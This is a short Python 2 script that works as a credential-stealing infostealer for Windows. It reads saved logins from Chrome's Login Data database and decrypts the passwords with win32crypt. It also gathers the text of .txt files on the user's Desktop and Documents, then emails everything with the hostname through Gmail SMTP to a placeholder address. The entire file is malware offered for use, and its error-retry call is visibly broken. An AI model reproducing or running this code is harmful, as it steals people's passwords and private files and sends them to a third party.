import os
import sqlite3
import win32crypt
import smtplib
import sys
import socket
import time
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText




def goto(creds):
    home = os.getenv("HOME")
    DOCUMENTS = os.path.expanduser('~')+"\\Documents"
    DESKTOP = os.path.expanduser('~')+"\\Desktop"
    f1 = ''
    
    for files in os.listdir(DOCUMENTS):
        if files.endswith('.txt'):
            filetext1 = open(DOCUMENTS+'/'+files, 'r').read()
            f1 += "\n+++++++++++++++++++++++++++++++++\n" + files + "\n" + filetext1
            
    for files1 in os.listdir(DESKTOP):
        if files1.endswith('.txt'):
            filetext2 = open(DESKTOP+'/'+files1, 'r').read()
            f1 += "\n+++++++++++++++++++++++++++++++++\n" + files1 + "\n" + filetext2
            
    sendmail(f1,creds)
    


def chromepass():
        try:
                path = sys.argv[1]
        except IndexError:
                for w in os.walk(os.getenv('USERPROFILE')):
                        if 'Chrome' in w[1]:
                                path = str(w[0]) + '\Chrome\User Data\Default\Login Data'

        try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
        except Exception, e:
                print '[-] %s' % (e) 
                sys.exit(1)

        try:
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        except Exception, e:
                print '[-] %s' % (e)
                sys.exit(1)

        data = cursor.fetchall()


        if len(data) > 0:
                creds = ''
                for result in data:
                        try:
                                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
                        except Exception, e:
                                print '[-] %s' % (e)
                                pass
                        creds += result[0] + " USERNAME: " + result[1] + " PASSWORD: " + password+"\n"

                goto(creds)
                        
        else:
                print '[-] No results returned from query'
                sys.exit(0)

def sendmail(f1,creds):
    try:
        user = socket.gethostname()
        from_addr = "EMAIL@gmail.com"
        to_addr   = "EMAIL@gmail.com"

        msg =  "---------\n" + MIMEText(creds).as_string() + "\n" + user + "\n" + f1 + "\n" 
        username  = "EMAIL@gmail.com"
        password  = "PASSWORD"
        server    = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username,password)
        server.sendmail(from_addr, to_addr, msg)
        print "Sent"
        server.quit()
        time.sleep(5)
       
               

    except smtplib.socket.gaierror as e:
        print
        print "\033[93mI can't connect to internet... I am going to sleep for 5 seconds.\033[0m"
        time.sleep(5)
        sendmail(msg_chrome)

if __name__ == '__main__':
        chromepass()
